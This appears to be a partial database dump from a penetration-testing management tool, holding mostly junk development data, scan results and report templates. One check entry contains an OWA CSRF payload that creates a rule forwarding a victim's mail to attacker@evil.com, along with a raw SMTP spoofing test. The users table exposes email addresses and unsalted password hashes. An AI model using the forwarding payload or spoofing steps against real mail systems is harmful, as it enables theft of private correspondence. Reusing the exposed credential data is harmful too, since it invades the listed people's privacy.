41	2	\N	\N	\N	\N	\N
42	1	Web Server SSL	\N	\N	\N	\N
42	2	\N	\N	\N	\N	\N
43	1	Web SQL XSS	\N	\N	\N	\N
43	2	\N	\N	\N	\N	\N
5	1	DNS Find NS	\N	\N	\N	\N
5	2	\N	\N	\N	\N	\N
8	1	DNS NIC Typosquatting	\N	\N	\N	\N
8	2	\N	\N	\N	\N	\N
11	1	DNS Resolve IP	\N	\N	\N	\N
11	2	\N	\N	\N	\N	\N
14	1	DNS SPF (Perl)	\N	\N	\N	\N
14	2	\N	\N	\N	\N	\N
45	1	DNS A (Non-Recursive)	\N	\N	\N	\N
45	2	\N	\N	\N	\N	\N
6	1	DNS Hosting	hello	\N	\N	\N
6	2	\N	\N	\N	\N	\N
3	1	DNS AFXR	hey <b>fuck \\' sss</b><br><b>How are you?<br></b>sd<br><b></b>1. this is some kind of list<br>2. lololo upup up<br>sdfa<br>asdf<br>asdf<br>sdd<br>sdf<br>sdf	jjj<br>what the fuck did you do?	\N	No more no more
3	2	ZXZXZXX	meowsfvfd<br>sdfsdf<br>sdf<br>sdf<br>sd<br>f<br>sdf<br>sd<br>f<br>sd<br>f<br>sdf	piu<i> poiu</i>	\N	\N
1	1	DNS A	blabla <a target="_blank" rel="nofollow" href="http://google.com">google.com</a><br><br>some shit<br><br>\r\n\r\n<a target="_blank" rel="nofollow" href="http://google.com">yay</a>.	\N	\N	\N
1	2	ZZZ	blabla <a target="_blank" rel="nofollow" href="http://google.com">google.com</a><br><br>some shit<br><br>\r\n\r\n<a target="_blank" rel="nofollow" href="http://google.com">yay</a>.	\N	\N	\N
46	2	\N	\N	\N	\N	\N
46	1	Scan Somethingh	<u></u>{&nbsp;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,\r\nbullet point&nbsp;</span><br>{\\fuck} {fuck} {shit}<br><ul><li>uno</li><li>dos</li><ul><li>inherited</li><li>list</li></ul><li>tres</li></ul><br><ol><li>eins</li><li>zwei</li><li>drei</li><ol><li>vier</li></ol><li>whatever</li></ol>Unter&nbsp;<a target="_blank" rel="nofollow" href="http://packetstormsecurity.org/files/view/85931/owa-bypass.txt">http://packetstormsecurity.org/files/view/85931/owa-bypass.txt</a>&nbsp;&nbsp;ist eine Schwachstelle <u>beschrieben</u>, wie man OWA Regeln umgehen kann.<br>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,&nbsp;</span><br>Dazu muss man eine Webseite einrichten, die der Benutzer besuchen muss.<span>Der nachfolgende Code muss auf einer Webseite sein, die ein angemeldeter OWA Benutzer besucht<br><br></span>Die Webseite muss dabei einen POST request durchführen, um eine Auto-Forward Regel einzurichten: &nbsp;<br><br>POST&nbsp;<span><a target="_blank" rel="nofollow" href="https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save">https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save</a>&gt;&nbsp;</span><br><br>&lt;input type="hidden"&nbsp;<br><br><span>name='&amp;#60params&amp;#62&amp;#60Id&amp;#62&amp;#60/Id&amp;#62&amp;#60Name&amp;#62Test&amp;#60/Name&amp;#62&amp;#60RecpA4&amp;#62&amp;#60item&amp;#62&amp;#60Rcp DN="attacker@evil.com" EM="attacker@evil.com" RT="SMTP" AO="3"&amp;#62&amp;#60/Rcp&amp;#62&amp;#60/item&amp;#62&amp;#60/RecpA4&amp;#62&amp;#60Actions&amp;#62&amp;#60item&amp;#62&amp;#60rca t="4"&amp;#62&amp;#60/rca&amp;#62&amp;#60/item&amp;#62&amp;#60/Actions&amp;#62&amp;#60/params&amp;#62' value=""&gt; &lt;/form&gt;<br></span>zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz<br>	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>	\N	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>
47	1	CMS check	\N	\N	\N	\N
47	2	\N	\N	\N	\N	\N
48	1	yay	\N	\N	\N	\N
48	2	\N	\N	\N	\N	\N
\.


--
-- TOC entry 2227 (class 0 OID 21693)
-- Dependencies: 158
-- Data for Name: clients; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY clients (id, name, country, state, city, address, postcode, website, contact_name, contact_phone, contact_email, contact_fax, logo_path, logo_type) FROM stdin;
2	Ziga										\N	\N	\N
4	Helloy										123-123-123	\N	\N
1	Test	Switzerland		Zurich	Kallison Lane, 7	123456	http://netprotect.ch	Ivan John		invan@john.com	123-123-123	40453852965cebb2b0dbc5440323bea3f5adf750c8b5f72e06b5fc7a9aad9da4	image/png
\.


--
-- TOC entry 2228 (class 0 OID 21701)
-- Dependencies: 160
-- Data for Name: emails; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY emails (id, user_id, subject, content, attempts, sent) FROM stdin;
8	1	Fuzz Check check has been finished	<html>\n    <body>\n        <p>Dear Oliver Muenchow,</p>\n\n        <p>\n            <a href="https://gtta.local/project/1/target/1/check/6#check-27">Fuzz Check</a> check on target <a href="https://gtta.local/project/1/target/1">google.com</a> has been finished.        </p>\n\n        <div>\n            ---<br>\n            GTTA Notification System        </div>\n    </body>\n</html>	0	f
\.


--
-- TOC entry 2229 (class 0 OID 21711)
-- Dependencies: 162
-- Data for Name: languages; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY languages (id, name, code, "default") FROM stdin;
1	English	en	t
2	Deutsch	de	f
\.


--
-- TOC entry 2230 (class 0 OID 21719)
-- Dependencies: 164
-- Data for Name: project_details; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY project_details (id, project_id, subject, content) FROM stdin;
2	1	hello	world
3	2	kekek	kkk\r\n
\.


--
-- TOC entry 2246 (class 0 OID 26344)
-- Dependencies: 187
-- Data for Name: project_users; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY project_users (project_id, user_id, admin) FROM stdin;
1	3	t
10	2	f
1	2	f
\.


--
-- TOC entry 2231 (class 0 OID 21727)
-- Dependencies: 166
-- Data for Name: projects; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY projects (id, client_id, year, deadline, name, status, vuln_overdue) FROM stdin;
1	1	2012	2012-07-27	Test	in_progress	2012-09-28
6	1	2012	2012-09-21	aaa	in_progress	\N
3	1	2012	2012-09-21	xxx	open	\N
4	2	2012	2012-09-21	yyy	open	\N
8	2	2012	2012-09-21	ccc	open	\N
9	2	2012	2012-09-21	fff	open	\N
10	1	2012	2012-09-21	ddd	open	\N
11	2	2012	2012-09-21	eee	open	\N
12	2	2013	2012-09-21	kokokoko	open	\N
5	1	2012	2012-09-21	zzz	finished	\N
2	2	2012	2012-07-29	Fuck	finished	\N
\.


--
-- TOC entry 2232 (class 0 OID 21736)
-- Dependencies: 168
-- Data for Name: references; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY "references" (id, name, url) FROM stdin;
1	CUSTOM	
\.


--
-- TOC entry 2254 (class 0 OID 28055)
-- Dependencies: 199
-- Data for Name: report_template_sections; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY report_template_sections (id, report_template_id, check_category_id, intro, sort_order, title) FROM stdin;
1	1	9	Project admin:&nbsp;{admin}	0	Hey
\.


--
-- TOC entry 2255 (class 0 OID 28075)
-- Dependencies: 200
-- Data for Name: report_template_sections_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY report_template_sections_l10n (report_template_section_id, language_id, intro, title) FROM stdin;
1	1	Project admin:&nbsp;{admin}	Hey
1	2	Project admin:&nbsp;{admin}	kkkkk
\.


--
-- TOC entry 2252 (class 0 OID 27336)
-- Dependencies: 196
-- Data for Name: report_template_summary; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY report_template_summary (id, summary, rating_from, rating_to, report_template_id, title) FROM stdin;
3	The general security state of the infrastructure is rated with a “{rating}”: low to medium critical”. This is a cumulative value that reflects the overall security\r\nstatus. Only a few problems can cause a severe impact. Therefore this value is\r\ndriven mainly by the vulnerabilities within a few devices.<br><br>Some of the vulnerabilities are critical. But none of them would help an\r\nattacker to immediately take over a system. Client "{client}" still has to be aware that this is only\r\na snapshot of the current situation. Any change in the future (like new\r\nexploits available for a specific system) could change the situation.&nbsp;	0.00	5.00	1	Everything is fine!
4		1.00	2.00	1	Hello
\.


--
-- TOC entry 2253 (class 0 OID 27347)
-- Dependencies: 197
-- Data for Name: report_template_summary_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY report_template_summary_l10n (report_template_summary_id, language_id, summary, title) FROM stdin;
3	1	The general security state of the infrastructure is rated with a “{rating}”: low to medium critical”. This is a cumulative value that reflects the overall security\r\nstatus. Only a few problems can cause a severe impact. Therefore this value is\r\ndriven mainly by the vulnerabilities within a few devices.<br><br>Some of the vulnerabilities are critical. But none of them would help an\r\nattacker to immediately take over a system. Client "{client}" still has to be aware that this is only\r\na snapshot of the current situation. Any change in the future (like new\r\nexploits available for a specific system) could change the situation.&nbsp;	Everything is fine!
3	2	\N	\N
4	1	\N	Hello
4	2	\N	\N
\.


--
-- TOC entry 2250 (class 0 OID 27306)
-- Dependencies: 193
-- Data for Name: report_templates; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY report_templates (id, name, header_image_path, header_image_type, intro, appendix, vulns_intro, info_checks_intro, security_level_intro, vuln_distribution_intro) FROM stdin;
3	Yay ;)	\N	\N					\N	\N
1	Test Template	0caf7534e0fee7a603c2948652ab8de6815ccea0b277340d7122269f4a847c89	image/png	Test Template Intro<br>The client is: {client}<br>The project is: {project}<br>Project year:&nbsp;<b>{year}<br></b>Project deadline: {deadline}<br>Project admin: {admin}<br>Project rating: {rating}<br>Date from: {date.from}<br>Date to: {date.to}<br>Targets: {targets}<br><br><b>Here's a list of targets:</b><br>{target.list}This text goes after the list of targets.<br><b>well done<br><br></b>number of checks: {checks} (info: {checks.info}, low: {checks.lo}, med: {checks.med}, high: {checks.hi})<br><b><br></b>{check.list}<b><br></b>well done	Test Template Appendix	World&nbsp;{client}	Info Checks go here ;)&nbsp;{client}	test one two {targets}	test one two&nbsp;{targets}
\.


--
-- TOC entry 2251 (class 0 OID 27315)
-- Dependencies: 194
-- Data for Name: report_templates_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY report_templates_l10n (report_template_id, language_id, name, intro, appendix, vulns_intro, info_checks_intro, security_level_intro, vuln_distribution_intro) FROM stdin;
3	1	Yay ;)	\N	\N	\N	\N	\N	\N
3	2	\N	\N	\N	\N	\N	\N	\N
1	1	Test Template	Test Template Intro<br>The client is: {client}<br>The project is: {project}<br>Project year:&nbsp;<b>{year}<br></b>Project deadline: {deadline}<br>Project admin: {admin}<br>Project rating: {rating}<br>Date from: {date.from}<br>Date to: {date.to}<br>Targets: {targets}<br><br><b>Here's a list of targets:</b><br>{target.list}This text goes after the list of targets.<br><b>well done<br><br></b>number of checks: {checks} (info: {checks.info}, low: {checks.lo}, med: {checks.med}, high: {checks.hi})<br><b><br></b>{check.list}<b><br></b>well done	Test Template Appendix	World&nbsp;{client}	Info Checks go here ;)&nbsp;{client}	test one two {targets}	test one two&nbsp;{targets}
1	2	zzz	Testen Templaten Intro	Testen Templaten Appendix	Worlda	\N	test eins zwei&nbsp;{targets}	test eins zwei&nbsp;{targets}
\.


--
-- TOC entry 2242 (class 0 OID 22073)
-- Dependencies: 183
-- Data for Name: risk_categories; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY risk_categories (id, name, risk_template_id) FROM stdin;
16	Fluger geheimer	3
17	Cat 1	4
18	cat 2	4
19	ZZZz	3
\.


--
-- TOC entry 2243 (class 0 OID 22082)
-- Dependencies: 184
-- Data for Name: risk_categories_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY risk_categories_l10n (risk_category_id, language_id, name) FROM stdin;
16	1	Fluger geheimer
16	2	Eins zwei
17	1	Cat 1
17	2	\N
18	1	cat 2
18	2	\N
19	1	ZZZz
19	2	AAAA
\.


--
-- TOC entry 2244 (class 0 OID 24899)
-- Dependencies: 185
-- Data for Name: risk_category_checks; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY risk_category_checks (risk_category_id, check_id, damage, likelihood) FROM stdin;
16	3	1	1
16	45	1	1
16	6	1	1
16	7	1	1
16	9	1	1
16	10	1	1
16	12	1	1
16	13	1	1
16	15	1	1
16	16	1	1
16	8	1	1
16	11	1	1
16	14	1	1
16	1	1	1
16	5	1	1
16	17	1	1
16	18	1	1
16	19	1	1
16	20	1	1
16	21	1	1
16	22	1	1
16	23	1	1
16	24	1	1
16	25	1	1
16	26	1	1
16	27	1	1
16	28	1	1
16	29	1	1
16	30	1	1
16	31	1	1
16	32	1	1
16	33	1	1
16	34	1	1
16	35	1	1
16	36	1	1
16	37	1	1
16	38	1	1
16	39	1	1
16	40	1	1
16	41	1	1
16	42	1	1
16	43	1	1
18	10	1	1
18	12	1	1
18	13	1	1
18	15	1	1
18	16	1	1
18	8	1	1
18	11	1	1
18	14	1	1
18	1	1	1
18	5	1	1
18	17	1	1
18	18	1	1
18	19	1	1
18	20	1	1
18	21	1	1
18	22	1	1
18	23	1	1
18	24	1	1
18	25	1	1
18	26	1	1
18	27	1	1
18	28	1	1
18	29	1	1
18	30	1	1
18	31	1	1
18	32	1	1
18	33	1	1
18	34	1	1
18	35	1	1
18	36	1	1
18	37	1	1
18	38	1	1
18	39	1	1
18	40	1	1
18	41	1	1
18	42	1	1
18	43	1	1
17	3	4	4
17	45	3	3
17	6	1	1
17	7	1	1
17	9	1	1
17	10	1	1
17	12	1	1
17	13	1	1
17	15	1	1
17	16	1	1
17	8	1	1
17	11	1	1
17	14	1	1
17	1	1	1
17	5	1	1
17	17	1	1
17	18	1	1
17	19	1	1
17	20	1	1
17	21	1	1
17	22	1	1
17	23	1	1
17	24	1	1
17	25	1	1
17	26	1	1
17	27	1	1
17	28	1	1
17	29	1	1
17	30	1	1
17	31	1	1
17	32	1	1
17	33	1	1
17	34	1	1
17	35	1	1
17	36	1	1
17	37	1	1
17	38	1	1
17	39	1	1
17	40	1	1
17	41	1	1
17	42	1	1
17	43	1	1
18	3	3	3
18	45	4	4
18	6	1	1
18	7	1	1
18	9	1	1
19	46	1	1
19	1	1	1
19	3	1	1
19	45	1	1
19	6	1	1
19	7	1	1
19	9	1	1
19	10	1	1
19	12	1	1
19	13	1	1
19	15	1	1
19	16	1	1
19	8	1	1
19	11	1	1
19	14	1	1
19	5	1	1
19	17	1	1
19	18	1	1
19	19	1	1
19	20	1	1
19	21	1	1
19	22	1	1
19	23	1	1
19	24	1	1
19	25	1	1
19	26	1	1
19	27	1	1
19	28	1	1
19	29	1	1
19	30	1	1
19	31	1	1
19	32	1	1
19	33	1	1
19	34	1	1
19	35	1	1
19	36	1	1
19	37	1	1
19	38	1	1
19	39	1	1
19	40	1	1
19	41	1	1
19	42	1	1
19	43	1	1
\.


--
-- TOC entry 2247 (class 0 OID 26361)
-- Dependencies: 189
-- Data for Name: risk_templates; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY risk_templates (id, name) FROM stdin;
3	Test Template
4	Another Tempalte
5	Fuck It
\.


--
-- TOC entry 2248 (class 0 OID 26370)
-- Dependencies: 190
-- Data for Name: risk_templates_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY risk_templates_l10n (risk_template_id, language_id, name) FROM stdin;
3	1	Test Template
3	2	Deutsche Template
4	1	Another Tempalte
4	2	\N
5	1	Fuck It
5	2	\N
\.


--
-- TOC entry 2245 (class 0 OID 26336)
-- Dependencies: 186
-- Data for Name: sessions; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY sessions (id, expire, data) FROM stdin;
92idvjmpldqshdm9jquv2apqo2      	1354270311	BXVssiPQLnuQVp6XzbYlz5puJd4-X85hplC_Im0VC_qq4CDyRDexnrFrzy-srklBpdilzOaCANL0P2JMS0RG80nDxuIPze7qH2QIG7o7wMxFIUatAwmpJIzT5t1gT2GGVqlKT0aZSzxTq5a1FhfSfHDMef6D-kzKs-bfbkiM2qySGACRdWU33RdlMTulDz-KWo_WC-1FJZRAv475wP4PJaU2CeRxO-ntyaJl3tzbu051gqxQy_XIcD8aSBI-pPw07OiRIF8mSfLdrDSxDfsYwGq4uGMK7ORbuSdYPyBAvW0H4TBMRVGwwyZak80Liiu0
\.


--
-- TOC entry 2233 (class 0 OID 21744)
-- Dependencies: 170
-- Data for Name: system; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY system (id, backup) FROM stdin;
1	2012-11-21 17:55:00.535688
\.


--
-- TOC entry 2234 (class 0 OID 21749)
-- Dependencies: 172
-- Data for Name: target_check_attachments; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY target_check_attachments (target_id, check_id, name, type, path, size) FROM stdin;
1	1	Счет Профиль.jpg	image/jpeg	d808c83ea477a9e92aad4cfd0584cbcabb64f867709facb1590f81ae12c73884	214138
2	27	_eng_images_support_down_photo_m_ek (1).jpg	image/jpeg	fd3c6970b8053745020efceb15883a50147e657969a961540ab08ce18e564b7d	272561
\.


--
-- TOC entry 2235 (class 0 OID 21756)
-- Dependencies: 173
-- Data for Name: target_check_categories; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY target_check_categories (target_id, check_category_id, advanced, check_count, finished_count, low_risk_count, med_risk_count, high_risk_count, info_count) FROM stdin;
1	1	t	15	14	4	4	0	1
2	6	t	18	4	0	1	0	2
4	1	t	15	0	0	0	0	0
5	1	t	15	0	0	0	0	0
6	6	t	18	3	0	1	0	2
1	2	t	1	1	0	0	0	1
1	11	t	1	0	0	0	0	0
1	9	t	2	2	1	0	0	1
2	3	t	4	0	0	0	0	0
1	8	t	0	0	0	0	0	0
1	3	t	4	0	0	0	0	0
1	4	t	1	0	0	0	0	0
1	5	t	3	0	0	0	0	0
1	10	t	0	0	0	0	0	0
1	6	t	18	1	0	0	0	0
\.


--
-- TOC entry 2236 (class 0 OID 21764)
-- Dependencies: 174
-- Data for Name: target_check_inputs; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY target_check_inputs (target_id, check_input_id, value, file, check_id) FROM stdin;
1	8	10	\N	8
1	9	100	\N	8
1	10	1	\N	8
1	5	120	\N	5
1	6	1	\N	5
1	15	\N	\N	17
1	16	\N	\N	17
1	11	\N	\N	12
1	12	\N	\N	13
1	13	0	\N	15
1	14	0	\N	16
1	7	0	\N	6
1	42	google.com	\N	45
2	31	10	\N	26
1	1	\N	fd7672e8249e025004f2067b1c93be8901a58d96a4a07eec8f6a6f53ff878df8	1
\.


--
-- TOC entry 2237 (class 0 OID 21770)
-- Dependencies: 175
-- Data for Name: target_check_solutions; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY target_check_solutions (target_id, check_solution_id, check_id) FROM stdin;
\.


--
-- TOC entry 2249 (class 0 OID 26906)
-- Dependencies: 191
-- Data for Name: target_check_vulns; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY target_check_vulns (target_id, check_id, user_id, deadline, status) FROM stdin;
\.


--
-- TOC entry 2238 (class 0 OID 21773)
-- Dependencies: 176
-- Data for Name: target_checks; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY target_checks (target_id, check_id, result, target_file, rating, started, pid, status, result_file, language_id, protocol, port, override_target, user_id) FROM stdin;
1	8	\N	\N	low_risk	\N	\N	finished	\N	1	\N	\N	\N	1
1	5	\N	\N	med_risk	\N	\N	finished	\N	1	\N	\N	\N	1
1	17	\N	\N	info	\N	\N	finished	\N	1	\N	\N	\N	1
1	10	\N	\N	med_risk	\N	\N	finished	\N	1	\N	\N	\N	1
1	12	\N	\N	low_risk	\N	\N	finished	\N	1	\N	\N	\N	1
1	13	\N	\N	med_risk	\N	\N	finished	\N	1	\N	\N	\N	1
1	15	\N	\N	low_risk	\N	\N	finished	\N	1	\N	\N	\N	1
1	16	\N	\N	low_risk	\N	\N	finished	\N	1	\N	\N	\N	1
1	6	\N	\N	\N	\N	\N	finished	\N	1	\N	\N	\N	1
1	45	\N	\N	\N	\N	\N	finished	\N	1	\N	\N	\N	1
1	14	\N	\N	med_risk	\N	\N	finished	\N	1	\N	\N	\N	1
1	3	\N	\N	info	\N	\N	finished	\N	1	\N	\N	\N	1
1	11	query failed: NXDOMAIN	ba958ad7b51889ad6b8cfc6c06d9d334417e50010bafe54f2d3df41eb8bd7524	\N	2012-10-12 03:19:08.402282	\N	finished	7b0b9efbc239fb0be3e01c8c7409a51e49797f209f914961c7002a585541ddeb	1	\N	\N	fuck it all	1
1	7	Error for 80.248.198.9 - NXDOMAIN\nError for 80.248.198.10 - NXDOMAIN\n80.248.198.11\t\tmail.core-central.com.\nError for 80.248.198.12 - NXDOMAIN\nError for 80.248.198.13 - NXDOMAIN\nError for 80.248.198.14 - NXDOMAIN\n	8db8e350872d7f8f5a904757929873d40b4907527b806750727e9acb5fb0ae31	\N	2012-10-12 03:24:01.747634	\N	finished	9efe9da38c259364f97fa07233a34a5bb43ae7a83ff2777ec8d021c8b72a40e5	1	\N	\N	80.248.198.9 - 80.248.198.14	1
1	9	report for 80.248.198.9 (80.248.198.9)\n% This is the RIPE Database query service.\n% The objects are in RPSL format.\n%\n% The RIPE Database is subject to Terms and Conditions.\n% See http://www.ripe.net/db/support/db-terms-conditions.pdf\n\n% Note: this output has been filtered.\n%       To receive output for a database update, use the "-B" flag.\n\n% Information related to '80.248.198.8 - 80.248.198.15'\n\ninetnum:        80.248.198.8 - 80.248.198.15\nnetname:        INTAMIN-NET\ndescr:          Intamin Transportation Ltd (Ritec AG)\ncountry:        LI\nadmin-c:        DO1084-RIPE\ntech-c:         DO1084-RIPE\nstatus:         ASSIGNED PA\nmnt-by:         TELECOM-LI-MNT\nsource:         RIPE # Filtered\n\n% Information related to '80.248.192.0/20AS20634'\n\nroute:          80.248.192.0/20	2a29974663f07789e79bb70d5eeb12a174d8c3618de10bc50182f977e2f5c82b	\N	2012-10-12 03:24:21.861818	\N	finished	6f1536eb2f83fd2dd9ca4c1a00424ce2af483b1ab4fbcc632125fae9a4128e7d	1	\N	\N	80.248.198.9	1
2	26	\N	\N	info	\N	\N	finished	\N	1	\N	\N	\N	1
2	28	\N	\N	hidden	\N	\N	finished	\N	1	\N	\N	\N	1
2	29	\N	\N	info	\N	\N	finished	\N	1	http	\N	\N	1
6	28	\N	\N	info	\N	\N	finished	\N	1	\N	\N	\N	1
6	29	\N	\N	info	\N	\N	finished	\N	1	http	\N	\N	1
2	27	\N	\N	med_risk	\N	\N	finished	\N	1	\N	\N	\N	1
6	30	\N	\N	med_risk	\N	\N	finished	\N	1	http	\N	\N	1
1	27	tried 879 time(s) with 0 successful time(s)\n	a3451332975f5af76b527ca807fc11cacb7a04d74650399d97b8631894871cc3	\N	2012-11-14 10:03:14.471584	\N	finished	eb1c5ad290d413e89ff0218759ea95776bdb5eb9ef339176fbd86d7c59cb8452	1	\N	\N	onexchanger.com	1
1	46	Auto-enabling plugin: grep.httpAuthDetect\nThe URL: "http://demonstratr.com" has <form> element with autocomplete capabilities.\nThe URL: "http://demonstratr.com/" has <form> element with autocomplete capabilities.\nNew URL found by webSpider plugin: http://demonstratr.com/\nNew URL found by webSpider plugin: http://demonstratr.com/redirect.php\nNew URL found by webSpider plugin: http://demonstratr.com/x.php\nFound 4 URLs and 7 different points of injection.\nThe list of URLs is:\n- http://demonstratr.com\n- http://demonstratr.com/\n- http://demonstratr.com/redirect.php\n- http://demonstratr.com/x.php\nThe list of fuzzable requests is:\n- http://demonstratr.com | Method: GET\n- http://demonstratr.com/ | Method: GET\n- http://demonstratr.com/ | Method: POST | Parameters: (login="", password="")\n- http://demonstratr.com/redirect.php | Method: GET | Parameters: (url="www")\n- http://demonstratr.com/redirect.php | Method: GET | Parameters: (url="www.google...")\n- http://demonstratr.com/x.php | Method: GET | Parameters: (go="www")\n- http://demonstratr.com/x.php | Method: GET | Parameters: (go="www.bing.c...")\nScan finished in 3 seconds.\n	13de8523bc591c0c649d9faa04c7bd299c43b307e8f7b21645e641dff0d67796	low_risk	2012-10-16 14:29:52.476709	\N	finished	d2183750509d6b7d48c8b699f53ec860936265c9479ac60b4d894bff0ed77f7e	1	\N	\N	demonstratr.com	1
1	47	No output.	daff9c357f092f45dd347a9ceb199488924a8148820d568eaede13a94728f2a1	\N	2012-11-26 07:09:01.609125	\N	finished	f08845086cba4dc36b7eaccd7071742540942bef7383300185ccb93211904cc6	1	http	80	infoguard.com	1
1	48	\N	\N	info	\N	\N	finished	\N	1	\N	\N	\N	1
1	1	TypeError: main() takes exactly 1 argument (2 given)\n	e8dbd7c26bd33fa4794b6c0b00a6dddd76f771d652d7843554fe95c60bd63f17	\N	2012-11-26 03:44:01.832243	\N	finished	0aaaed3bc1b89672d4d4119323dd22a66842a726797b55fa4f45bce76d46988e	1	\N	\N	lenta.ru	1
\.


--
-- TOC entry 2239 (class 0 OID 21780)
-- Dependencies: 177
-- Data for Name: target_references; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY target_references (target_id, reference_id) FROM stdin;
1	1
2	1
3	1
4	1
5	1
6	1
\.


--
-- TOC entry 2240 (class 0 OID 21783)
-- Dependencies: 178
-- Data for Name: targets; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY targets (id, project_id, host, description) FROM stdin;
3	1	empty.com	\N
4	2	127.0.0.1	\N
5	12	127.0.0.1	\N
2	1	test.com	\N
6	6	test.com	\N
1	1	google.com	Main Webserver
\.


--
-- TOC entry 2241 (class 0 OID 21791)
-- Dependencies: 180
-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY users (id, email, password, name, client_id, role) FROM stdin;
1	oliver@muenchow.ch	a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3	Oliver Muenchow	\N	admin
2	test@client.com	a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3		1	client
3	erbol.turburgaev@gmail.com	a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3		\N	user
\.


--
-- TOC entry 2064 (class 2606 OID 21816)
-- Dependencies: 142 142 142
-- Name: check_categories_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY check_categories_l10n
    ADD CONSTRAINT check_categories_l10n_pkey PRIMARY KEY (check_category_id, language_id);


--
-- TOC entry 2062 (class 2606 OID 21818)
-- Dependencies: 140 140
-- Name: check_categories_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY check_categories
    ADD CONSTRAINT check_categories_pkey PRIMARY KEY (id);


--
-- TOC entry 2068 (class 2606 OID 21820)
-- Dependencies: 145 145 145
-- Name: check_controls_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY check_controls_l10n
    ADD CONSTRAINT check_controls_l10n_pkey PRIMARY KEY (check_control_id, language_id);


--
-- TOC entry 2066 (class 2606 OID 21822)
-- Dependencies: 143 143
-- Name: check_controls_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
--

ALTER TABLE ONLY check_controls
    ADD CONSTRAINT check_controls_pkey PRIMARY KEY (id);


--
-- TOC entry 2072 (class 2606 OID 21824)
-- Dependencies: 148 148 148
